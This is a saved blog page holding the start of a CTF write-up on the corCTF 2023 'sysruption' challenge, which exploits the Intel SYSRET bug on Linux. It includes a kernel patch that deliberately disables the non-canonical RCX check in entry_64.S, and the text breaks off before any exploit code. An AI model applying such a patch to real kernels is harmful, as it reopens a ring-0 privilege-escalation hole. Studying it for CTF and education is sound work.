<!DOCTYPE html>
<!-- saved from url=(0048)https://www.willsroot.io/2023/08/sysruption.html -->
<html class="v2" dir="ltr" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link href="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/3566091532-css_bundle_v2.css" rel="stylesheet" type="text/css">
<meta content="width=1100" name="viewport">

<meta content="blogger" name="generator">
<link href="https://www.willsroot.io/favicon.ico" rel="icon" type="image/x-icon">
<link href="https://www.willsroot.io/2023/08/sysruption.html" rel="canonical">
<link rel="alternate" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.willsroot.io/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="Will&#39;s Root - RSS" href="https://www.willsroot.io/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.blogger.com/feeds/8814147965526194982/posts/default">

<link rel="alternate" type="application/atom+xml" title="Will&#39;s Root - Atom" href="https://www.willsroot.io/feeds/7906062095855303988/comments/default">
<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
<link href="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/sysruption.gif" rel="image_src">
<meta content="https://www.willsroot.io/2023/08/sysruption.html" property="og:url">
<meta content="corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023" property="og:title">
<meta content="A blog about pentesting, CTFs, and security" property="og:description">
<meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjAcUiuYEopYBfYCk1IqxWFONjV-k1vfeveEGLol7ESAsZseJ9ebCoMy54NzObP6roMDYEKkROfFyDmE1SvZubmK8knHo7hNtQAo9jyJH8DIQlnj4WupkieaHufbAr-DhTr8z1RmDphClRjQXXm-bi07ul1Nb77UQHqYygQqgh5g2VtFdkwWgMUn0qAnr9/w1200-h630-p-k-no-nu/sysruption.gif" property="og:image">
<title>Will's Root: corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023</title>
<style type="text/css">@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu72xKOzY.woff2)format('woff2');unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu5mxKOzY.woff2)format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu7mxKOzY.woff2)format('woff2');unicode-range:U+1F00-1FFF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4WxKOzY.woff2)format('woff2');unicode-range:U+0370-03FF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu7WxKOzY.woff2)format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu7GxKOzY.woff2)format('woff2');unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;}@font-face{font-family:'Roboto';font-style:normal;font-weight:400;src:url(//fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2)format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}</style>
<style id="page-skin-1" type="text/css"><!--
/*-----------------------------------------------
Blogger Template Style
Name:     Picture Window
Designer: Blogger
URL:      www.blogger.com
----------------------------------------------- */
/* Content
----------------------------------------------- */
body {
font: normal normal 16px Roboto;
color: #000000;
background: #e5e5e5 url(//2.bp.blogspot.com/-ErizLnNeTcI/XXVJdtjs78I/AAAAAAAABkQ/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw/s0/blog_background.jpg) repeat scroll top left;
}
html body .region-inner {
min-width: 0;
max-width: 100%;
width: auto;
}
.content-outer {
font-size: 90%;
}
a:link {
text-decoration:none;
color: #fc0404;
}
a:visited {
text-decoration:none;
color: #fc0e0e;
}
a:hover {
text-decoration:underline;
color: #ff3f3f;
}
.content-outer {
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/white80.png) repeat scroll top left;
-moz-border-radius: 15px;
-webkit-border-radius: 15px;
-goog-ms-border-radius: 15px;
border-radius: 15px;
-moz-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 3px rgba(0, 0, 0, .15);
box-shadow: 0 0 3px rgba(0, 0, 0, .15);
margin: 30px auto;
}
.content-inner {
padding: 15px;
}
/* Header
----------------------------------------------- */
.header-outer {
background: rgba(0, 0, 0, 0) url(https://resources.blogblog.com/blogblog/data/1kt/transparent/header_gradient_shade.png) repeat-x scroll top left;
_background-image: none;
color: #ff0000;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.Header img, .Header #header-inner {
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 30px;
padding-right: 30px;
}
.Header h1 {
font: normal bold 39px 'Courier New', Courier, FreeMono, monospace;
text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
}
.Header h1 a {
color: #ff0000;
}
.Header .description {
font-size: 130%;
}
/* Tabs
----------------------------------------------- */
.tabs-inner {
margin: .5em 0 0;
padding: 0;
}
.tabs-inner .section {
margin: 0;
}
.tabs-inner .widget ul {
padding: 0;
background: #fbfbfb url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
-goog-ms-border-radius: 10px;
border-radius: 10px;
}
.tabs-inner .widget li {
border: none;
}
.tabs-inner .widget li a {
display: inline-block;
padding: .5em 1em;
margin-right: 0;
color: #992211;
font: normal normal 15px Roboto;
-moz-border-radius: 0 0 0 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-radius: 0 0 0 0;
border-radius: 0 0 0 0;
background: transparent none no-repeat scroll top left;
border-right: 1px solid #d5d5d5;
}
.tabs-inner .widget li:first-child a {
padding-left: 1.25em;
-moz-border-radius-topleft: 10px;
-moz-border-radius-bottomleft: 10px;
-webkit-border-top-left-radius: 10px;
-webkit-border-bottom-left-radius: 10px;
-goog-ms-border-top-left-radius: 10px;
-goog-ms-border-bottom-left-radius: 10px;
border-top-left-radius: 10px;
border-bottom-left-radius: 10px;
}
.tabs-inner .widget li.selected a,
.tabs-inner .widget li a:hover {
position: relative;
z-index: 1;
background: #ffffff url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
color: #000000;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
/* Headings
----------------------------------------------- */
h2 {
font: normal bold 100% 'Courier New', Courier, FreeMono, monospace;
text-transform: uppercase;
color: #ff0000;
margin: .5em 0;
}
/* Main
----------------------------------------------- */
.main-outer {
background: transparent none repeat scroll top center;
-moz-border-radius: 0 0 0 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-radius: 0 0 0 0;
border-radius: 0 0 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
.main-inner {
padding: 15px 5px 20px;
}
.main-inner .column-center-inner {
padding: 0 0;
}
.main-inner .column-left-inner {
padding-left: 0;
}
.main-inner .column-right-inner {
padding-right: 0;
}
/* Posts
----------------------------------------------- */
h3.post-title {
margin: 0;
font: normal bold 24px 'Courier New', Courier, FreeMono, monospace;
}
.comments h4 {
margin: 1em 0 0;
font: normal bold 24px 'Courier New', Courier, FreeMono, monospace;
}
.date-header span {
color: #ff0000;
}
.post-outer {
background-color: #ffffff;
border: solid 1px #e5e5e5;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 10px;
-goog-ms-border-radius: 10px;
padding: 15px 20px;
margin: 0 -20px 20px;
}
.post-body {
line-height: 1.4;
font-size: 110%;
position: relative;
}
.post-header {
margin: 0 0 1.5em;
color: #a8a8a8;
line-height: 1.6;
}
.post-footer {
margin: .5em 0 0;
color: #a8a8a8;
line-height: 1.6;
}
#blog-pager {
font-size: 140%
}
#comments .comment-author {
padding-top: 1.5em;
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
background-position: 0 1.5em;
}
#comments .comment-author:first-child {
padding-top: 0;
border-top: none;
}
.avatar-image-container {
margin: .2em 0 0;
}
/* Comments
----------------------------------------------- */
.comments .comments-content .icon.blog-author {
background-repeat: no-repeat;
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEgAACxIB0t1+/AAAAAd0SU1FB9sLFwMeCjjhcOMAAAD+SURBVDjLtZSvTgNBEIe/WRRnm3U8RC1neQdsm1zSBIU9VVF1FkUguQQsD9ITmD7ECZIJSE4OZo9stoVjC/zc7ky+zH9hXwVwDpTAWWLrgS3QAe8AZgaAJI5zYAmc8r0G4AHYHQKVwII8PZrZFsBFkeRCABYiMh9BRUhnSkPTNCtVXYXURi1FpBDgArj8QU1eVXUzfnjv7yP7kwu1mYrkWlU33vs1QNu2qU8pwN0UpKoqokjWwCztrMuBhEhmh8bD5UDqur75asbcX0BGUB9/HAMB+r32hznJgXy2v0sGLBcyAJ1EK3LFcbo1s91JeLwAbwGYu7TP/3ZGfnXYPgAVNngtqatUNgAAAABJRU5ErkJggg==);
}
.comments .comments-content .loadmore a {
border-top: 1px solid #ff3f3f;
border-bottom: 1px solid #ff3f3f;
}
.comments .continue {
border-top: 2px solid #ff3f3f;
}
/* Widgets
----------------------------------------------- */
.widget ul, .widget #ArchiveList ul.flat {
padding: 0;
list-style: none;
}
.widget ul li, .widget #ArchiveList ul.flat li {
border-top: dashed 1px #ccc;
border-top: dashed 1px rgba(128, 128, 128, .5);
}
.widget ul li:first-child, .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.widget .post-body ul {
list-style: disc;
}
.widget .post-body ul li {
border: none;
}
/* Footer
----------------------------------------------- */
.footer-outer {
color:#f5f5f5;
background: transparent url(https://resources.blogblog.com/blogblog/data/1kt/transparent/black50.png) repeat scroll top left;
-moz-border-radius: 10px 10px 10px 10px;
-webkit-border-top-left-radius: 10px;
-webkit-border-top-right-radius: 10px;
-webkit-border-bottom-left-radius: 10px;
-webkit-border-bottom-right-radius: 10px;
-goog-ms-border-radius: 10px 10px 10px 10px;
border-radius: 10px 10px 10px 10px;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .15);
box-shadow: 0 0 0 rgba(0, 0, 0, .15);
}
.footer-inner {
padding: 10px 5px 20px;
}
.footer-outer a {
color: #fc5858;
}
.footer-outer a:visited {
color: #fc5858;
}
.footer-outer a:hover {
color: #fc5858;
}
.footer-outer .widget h2 {
color: #c6c6c6;
}
/* Mobile
----------------------------------------------- */
html body.mobile {
height: auto;
}
html body.mobile {
min-height: 480px;
background-size: 100% auto;
}
.mobile .body-fauxcolumn-outer {
background: transparent none repeat scroll top left;
}
html .mobile .mobile-date-outer, html .mobile .blog-pager {
border-bottom: none;
background: transparent none repeat scroll top center;
margin-bottom: 10px;
}
.mobile .date-outer {
background: transparent none repeat scroll top center;
}
.mobile .header-outer, .mobile .main-outer,
.mobile .post-outer, .mobile .footer-outer {
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.mobile .content-outer,
.mobile .main-outer,
.mobile .post-outer {
background: inherit;
border: none;
}
.mobile .content-outer {
font-size: 100%;
}
.mobile-link-button {
background-color: #fc0404;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
.mobile-index-contents {
color: #000000;
}
.mobile .tabs-inner .PageList .widget-content {
background: #ffffff url(https://resources.blogblog.com/blogblog/data/1kt/transparent/tabs_gradient_shade.png) repeat scroll bottom;
color: #000000;
}
.mobile .tabs-inner .PageList .widget-content .pagelist-arrow {
border-left: 1px solid #d5d5d5;
}
.code { background:#f5f8fa; background-repeat:no-repeat; border: solid #5C7B90; border-width: 1px 1px 1px 20px; color: #000000; font: 13px 'Courier New', Courier, monospace; line-height: 16px; margin: 10px 0 10px 10px; max-height: 10000px; min-height: 16px; overflow: auto; padding: 28px 10px 10px; width: 90%; } .code:hover { background-repeat:no-repeat; }
--></style>
<style id="template-skin-1" type="text/css"><!--
body {
min-width: 1010px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 1010px;
max-width: 1010px;
_width: 1010px;
}
.main-inner .columns {
padding-left: 0px;
padding-right: 240px;
}
.main-inner .fauxcolumn-center-outer {
left: 0px;
right: 240px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0px") -
parseInt("240px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0px;
}
.main-inner .fauxcolumn-right-outer {
width: 240px;
}
.main-inner .column-left-outer {
width: 0px;
right: 100%;
margin-left: -0px;
}
.main-inner .column-right-outer {
width: 240px;
margin-right: -240px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
body#layout div.add_widget {
padding: 8px;
}
body#layout div.add_widget a {
margin-left: 32px;
}
--></style>
<style>
    body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/s0\/blog_background.jpg);}
    
@media (max-width: 200px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w200\/blog_background.jpg);}}
@media (max-width: 400px) and (min-width: 201px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w400\/blog_background.jpg);}}
@media (max-width: 800px) and (min-width: 401px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w800\/blog_background.jpg);}}
@media (max-width: 1200px) and (min-width: 801px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w1200\/blog_background.jpg);}}
/* Last tag covers anything over one higher than the previous max-size cap. */
@media (min-width: 1201px) { body {background-image:url(\/\/2.bp.blogspot.com\/-ErizLnNeTcI\/XXVJdtjs78I\/AAAAAAAABkQ\/r2zM7v6Vc-8n4hsOZmLjDe4USethBxzSgCK4BGAYYCw\/w1600\/blog_background.jpg);}}
  </style>
<link href="./Will&#39;s Root_ corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023_files/authorization.css" media="all" onload="if(media!=&#39;all&#39;)media=&#39;all&#39;" rel="stylesheet"><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=8814147965526194982&amp;zx=6ef61181-13a0-48e5-bdee-32a716203598' rel='stylesheet'/></noscript>
<meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
<meta name="google-adsense-platform-domain" content="blogspot.com">

</head>
<body class="loading variant-shade">
<div class="navbar no-items section" id="navbar" name="Navbar">
</div>
<div class="body-fauxcolumns">
<div class="fauxcolumn-outer body-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content">
<div class="content-fauxcolumns">
<div class="fauxcolumn-outer content-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content-outer">
<div class="content-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left content-fauxborder-left">
<div class="fauxborder-right content-fauxborder-right"></div>
<div class="content-inner">
<header>
<div class="header-outer">
<div class="header-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left header-fauxborder-left">
<div class="fauxborder-right header-fauxborder-right"></div>
<div class="region-inner header-inner">
<div class="header section" id="header" name="Header"><div class="widget Header" data-version="1" id="Header1">
<div id="header-inner" style="background-image: url(&quot;//3.bp.blogspot.com/-Vq2QZ98cq1M/V3RUcENYgkI/AAAAAAAAAqA/3PhYksj1tX0_3YiZ51aP-rauPp2FRgN9QCK4B/s1057/COOL%2BAUDIO%2BWAVES-for-blog.jpg&quot;); background-position: left; min-height: 294px; _height: 294px; background-repeat: no-repeat; ">
<div class="titlewrapper" style="background: transparent">
<h1 class="title" style="background: transparent; border-width: 0px">
<a href="https://www.willsroot.io/">
Will's Root
</a>
</h1>
</div>
<div class="descriptionwrapper">
<p class="description"><span>Pentesting, CTFs, and Writeups</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class="header-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</header>
<div class="tabs-outer">
<div class="tabs-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left tabs-fauxborder-left">
<div class="fauxborder-right tabs-fauxborder-right"></div>
<div class="region-inner tabs-inner">
<div class="tabs section" id="crosscol" name="Cross-Column"><div class="widget BlogSearch" data-version="1" id="BlogSearch1">
<h2 class="title">Search This Blog</h2>
<div class="widget-content">
<div id="BlogSearch1_form">
<form action="https://www.willsroot.io/search" class="gsc-search-box" target="_top">
<table cellpadding="0" cellspacing="0" class="gsc-search-box">
<tbody>
<tr>
<td class="gsc-input">
<input autocomplete="off" class="gsc-input" name="q" size="10" title="search" type="text" value="">
</td>
<td class="gsc-search-button">
<input class="gsc-search-button" title="search" type="submit" value="Search">
</td>
</tr>
</tbody>
</table>
</form>
</div>
</div>
<div class="clear"></div>
</div></div>
<div class="tabs no-items section" id="crosscol-overflow" name="Cross-Column 2"></div>
</div>
</div>
<div class="tabs-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="main-outer">
<div class="main-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left main-fauxborder-left">
<div class="fauxborder-right main-fauxborder-right"></div>
<div class="region-inner main-inner">
<div class="columns fauxcolumns">
<div class="fauxcolumn-outer fauxcolumn-center-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-left-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-right-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<!-- corrects IE6 width calculation -->
<div class="columns-inner">
<div class="column-center-outer">
<div class="column-center-inner">
<div class="main section" id="main" name="Main"><div class="widget Blog" data-version="1" id="Blog1">
<div class="blog-posts hfeed">

          <div class="date-outer">
        
<h2 class="date-header"><span>Wednesday, August 2, 2023</span></h2>

          <div class="date-posts">
        
<div class="post-outer">
<div class="post hentry uncustomized-post-template" itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
<meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjAcUiuYEopYBfYCk1IqxWFONjV-k1vfeveEGLol7ESAsZseJ9ebCoMy54NzObP6roMDYEKkROfFyDmE1SvZubmK8knHo7hNtQAo9jyJH8DIQlnj4WupkieaHufbAr-DhTr8z1RmDphClRjQXXm-bi07ul1Nb77UQHqYygQqgh5g2VtFdkwWgMUn0qAnr9/w640-h384/sysruption.gif" itemprop="image_url">
<meta content="8814147965526194982" itemprop="blogId">
<meta content="7906062095855303988" itemprop="postId">
<a name="7906062095855303988"></a>
<h3 class="post-title entry-title" itemprop="name">
corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023
</h3>
<div class="post-header">
<div class="post-header-line-1"></div>
</div>
<div class="post-body entry-content" id="post-body-7906062095855303988" itemprop="description articleBody">
<p>Sysruption was a hardware, micro-architectural, and kernel 
exploitation challenge I wrote for corCTF 2023. It is my personal 
favorite challenge for this CTF as it tied closely into my first µarch 
CVE (EntryBleed), showcased the applicability of a µarch attack in a 
realistic exploit, and was built on the premise of a real hardware bug.</p><p>This bug has re-appeared multiple times throughout the years, 
manifesting first in <a href="https://github.com/torvalds/linux/commit/7bf36bbc5e0c09271f9efe22162f8cc3f8ebd3d2" target="_blank">CVE-2006-0744</a>. It subsequently returns to haunt systems in <a href="https://nvd.nist.gov/vuln/detail/cve-2012-0217" target="_blank">CVE-2012-0217</a>,
 affecting FreeBSD, Xen hypervisor, Solaris, Windows 7, and many other 
operating systems - people have documented their exploits for different 
OSes such as this <a href="https://fail0verflow.com/blog/2012/cve-2012-0217-intel-sysret-freebsd/" target="_blank">one</a> for FreeBSD and this <a href="https://xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/" target="_blank">one</a> for Xen hypervisor. To my knowledge, the last publicly known time this bug came back again was in <a href="https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis" target="_blank">CVE-2014-4699</a>
 on Linux. Since 2014 was before the era of all the modern kernel 
mitigations like KASLR and the previous writeup targeted it on a system 
without SMAP and with a writeable IDTs, the premise of this challenge 
became exploiting this on a modern Linux system with standard hardening 
features. Before I continue, a huge shout out must go to zolutal for 
first-blooding this challenge - he has a really <a href="https://zolutal.github.io/corctf-sysruption/" target="_blank">amazing writeup</a> for it!</p>
<p>I first heard about this bug in MIT’s <a href="http://csg.csail.mit.edu/6.S983/" target="_blank">6.888</a>
 Secure Hardware Design Course, which also taught me about the prefetch 
attack that inspired EntryBleed through their lab assignments (along 
with other cool labs like Spectre, Rowhammer, L2 prime and probe, and RISC-V CPU fuzzing). So what exactly is this sysret 
bug?</p>
<p>According to Intel, this is <a href="https://www.kb.cert.org/vuls/id/649219" target="_blank">not a bug</a>&nbsp;(but a feature?) - it’s the software developer’s fault for not 
carefully reading the documentation. To quote the SDM:</p><p>SYSRET is a 
companion instruction to the SYSCALL instruction. It returns from an OS 
system-call handler to user code at privilege level 3. It does so by 
loading RIP from RCX and loading RFLAGS from R11. With a 64-bit operand 
size, SYSRET remains in 64-bit mode; otherwise, it enters compatibility 
mode and only the low 32 bits of the registers are loaded.</p><p>As the 
documentation then proceeds to state, if the RCX address is 
non-canonical, then a general protection fault happens in ring 0, so the
 exception handler in ring 0 runs. In contrast, AMD has the fault 
happen in userland (which would then crash the process in ring 3). By 
having a general protection fault happen in a syscall return sequence 
where all the userland registers have been restored (including the stack
 pointer) at ring 0, the exception handler will happily start saving the
 current CPU state with the restored stack pointer, effectively giving us
 an arbitrary write vulnerability using the pre-exception register state.</p>
<p>To bring back this bug, I made the following patch, on kernel 6.3.4.&nbsp;</p><p><span style="background-color: whitesmoke; display: block; font-family: monospace; max-width: 100%; overflow-x: auto; white-space: pre;"><span class="hljs-comment" style="color: #6a737d;">--- orig_entry_64.S</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-comment" style="color: #6a737d;">+++ linux-6.3.4/arch/x86/entry/entry_64.S</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-meta" style="color: #005cc5;">@@ -150,13 +150,13 @@</span><span style="background-color: whitesmoke; color: #24292e;">
    ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", \
        "shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
</span><span class="hljs-deletion" style="background-color: #ffeef0; color: #b31d28;">-   shl $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-deletion" style="background-color: #ffeef0; color: #b31d28;">-   sar $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-addition" style="background-color: #f0fff4; color: #22863a;">+   # shl   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-addition" style="background-color: #f0fff4; color: #22863a;">+   # sar   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx</span><span style="background-color: whitesmoke; color: #24292e;">
 #endif

    /* If this changed %rcx, it was not canonical */
</span><span class="hljs-deletion" style="background-color: #ffeef0; color: #b31d28;">-   cmpq    %rcx, %r11</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-deletion" style="background-color: #ffeef0; color: #b31d28;">-   jne swapgs_restore_regs_and_return_to_usermode</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-addition" style="background-color: #f0fff4; color: #22863a;">+   # cmpq  %rcx, %r11</span><span style="background-color: whitesmoke; color: #24292e;">
</span><span class="hljs-addition" style="background-color: #f0fff4; color: #22863a;">+   # jne   swapgs_restore_regs_and_return_to_usermode</span><span style="background-color: whitesmoke; color: #24292e;">

    cmpq    $__USER_CS, CS(%rsp)        /* CS must match SYSRET */
    jne swapgs_restore_regs_and_return_to_usermode</span></span></p><p>This effectively reverts a precise check for non-canonical addresses introduced by this <a href="https://lore.kernel.org/lkml/CALCETrUQtHLLEHqq=PJdf7QDUP_RjbS2szKgHa210+VMgotsPg@mail.gmail.com/T/#mb45968216839a3cff3686685068ef0deb647db26" target="_blank">patch</a>.</p><p>How exactly do we trigger this bug? The 2014 CVE <a href="https://github.com/vnik5287/cve-2014-4699-ptrace/blob/master/poc_v0.c" target="_blank">PoC</a>
 is still applicable in this case, and I borrowed that with a few slight
 modifications. The PoC basically chained ptrace and forks in a way to 
modify the registers such that the grandchild task attempts to return to
 a non-canonical address upon sysret. A canonical address is simply one 
where bit 63 to whatever the highest bit supported by the chipset is all
 1s or 0s (hence the <code>shl</code> and <code>sar</code> usage in the original check). I was actually surprised that this still worked, as Linux introduced a <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b9cd18de4db3c9ffa7e17b0dc0ca99ed5aa4d43a" target="_blank">patch</a> to force irets for this chain of ptrace usage. Fortunately for us, this was actually removed in a subsequent <a href="https://lore.kernel.org/all/CAMzpN2i+DrKkzDyiS6Cj61LmCu+--e5puQpKrNxYVMDRPMvvBw@mail.gmail.com/T/#t" target="_blank">patch</a> once the stronger check before sysret was introduced.</p><p>Unlike the 2014 PoC, the Linux kernel now comes with KASLR. This is 
where the second main component of my challenge comes in - a 
micro-architectural (or µarch) attack. In my opinion, µarch attacks are often 
overlooked in developing exploits when talking to some people working in
